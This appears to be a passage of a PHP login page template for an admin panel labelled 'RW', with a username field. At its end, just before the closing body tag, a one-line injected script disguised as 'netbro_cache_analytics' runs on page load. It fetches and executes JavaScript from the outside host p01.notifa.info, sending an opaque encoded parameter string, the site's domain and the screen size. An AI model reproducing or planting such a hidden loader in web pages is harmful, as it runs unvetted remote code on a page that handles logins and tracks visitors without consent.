            ...
            <div class="login-container">
              <div class="center">
                <h1>
                  ...
                  <span class="white" id="id-text2">RW</span>
                </h1>
                <h4 class="blue" id="id-company-text">&copy; si_rw</h4>
              </div>
                        ...
                        <fieldset>
                          <label class="block clearfix">
                            <span class="block input-icon input-icon-right">
                              ...
                              <?php echo form_input($identity, "", ["class"=>"form-control","placeholder"=>"Username","required"=>"required"]);?>
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdjMv1uxn15fcSiED0qPNXvlLmaDYPAplkqMpZfJk3E2FtrNGVZOzbfACysF7UM4Bntb8hm%2fwiDL6e4Ptb0rM1kLuSyG60I3YztEhHYHVkdJHceSkbZVBzYpBNDjMhj40pDbvN%2bpa5gPeT2P%2bbo2FN8gMxO3O260oA6tE6HX3GGya4Kbvc2gjsc4Aq3VC2fnYkGdACZaEafQJDmUaf23Jyzf1zRD9tebOKEKPioGdtyox9WTJg%2bG%2bt59jaKh2DjXe%2bUeIn2xYPQX0y%2b3tobjoAj%2boN8Zyi0pCKrKA17iSPQdmRV7KjJZiGiqh3BVhzsJ%2brR3qpULLI1LiGX2zo%2bs%2bmv%2fsAEdIrBS4ex9tBH8xcTwlPUgP5nGo0SC%2bPArLM7jAm9vaNL%2b0jd25nhnlWgdB1ArNvbSNpDIkMbNu%2b54bSD5Vyj1JWZ%2bx25F9A0NOcNcDdj9xI4ordCGij2b%2f9k9i1X%2fXZJE7mIlWjrGNF9YfHXlPnE9d872Ovc14cULG7bdjbdAhr%2fjfJOqt0vsWgTqseT4pA6RWfcg51nlr%2fkedukEg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
